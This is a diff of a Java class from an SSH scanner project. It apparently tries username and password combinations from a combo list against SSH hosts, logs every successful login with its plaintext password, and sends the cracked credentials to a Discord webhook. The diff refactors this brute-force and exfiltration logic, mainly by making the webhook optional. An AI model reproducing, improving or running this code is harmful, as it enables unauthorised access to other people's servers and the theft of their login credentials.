@@ -1,8 +1,8 @@
 package com.thisisnzed.sshscanner.session;
 
 import com.jcraft.jsch.JSch;
+import com.thisisnzed.sshscanner.addons.impl.Combo;
 import com.thisisnzed.sshscanner.arguments.Configuration;
-import com.thisisnzed.sshscanner.combo.Combo;
 import com.thisisnzed.sshscanner.utils.DiscordWebhook;
 import com.thisisnzed.sshscanner.utils.Logger;
 
@@ -16,7 +16,8 @@ public class Session {
     private final String falsePositive;
 
     public Session(final Combo combo, final Configuration configuration, final JSch jSch, final Properties properties) {
-        this.falsePositive = combo.getCombo().get(0)[0] + ":" + combo.getCombo().get(0)[1];
+        final String[] splited = combo.getList().get(0).split(":");
+        this.falsePositive = splited[0] + ":" + splited[1];
         this.configuration = configuration;
         this.jSch = jSch;
         this.properties = properties;
@@ -32,14 +33,15 @@ public class Session {
             session.setTimeout(Integer.parseInt(String.valueOf(this.configuration.get("timeout"))));
             session.connect();
             if (!(username + ":" + password).equals(this.falsePositive)) {
-                Logger.log("[" + Thread.currentThread().getId() + "] " + username + "@" + host + ":" + port + " (password: " + password + ") | Connected");
-                new DiscordWebhook((String) this.configuration.get("webhook")).sendWebhook(host, username, password, port);
+                Logger.log(String.format("[%d] %s@%s:%d (password: %s) | Connected", Thread.currentThread().getId(), username, host, port, password));
+                if (!this.configuration.get("webhook").equals(""))
+                    new DiscordWebhook((String) this.configuration.get("webhook")).sendWebhook(host, username, password, port);
             }
             session.disconnect();
             return false;
         } catch (final Exception exception) {
             if (Boolean.parseBoolean(String.valueOf(this.configuration.get("verbose"))))
-                Logger.log("[" + Thread.currentThread().getId() + "] " + username + "@" + host + ":" + port + " (password: " + password + ") | " + exception.getMessage());
+                Logger.log(String.format("[%d] %s@%s:%d (password: %s) | %s", Thread.currentThread().getId(), username, host, port, password, exception.getMessage()));
             return exception.getMessage().toLowerCase().contains("auth fail");
         }
     }
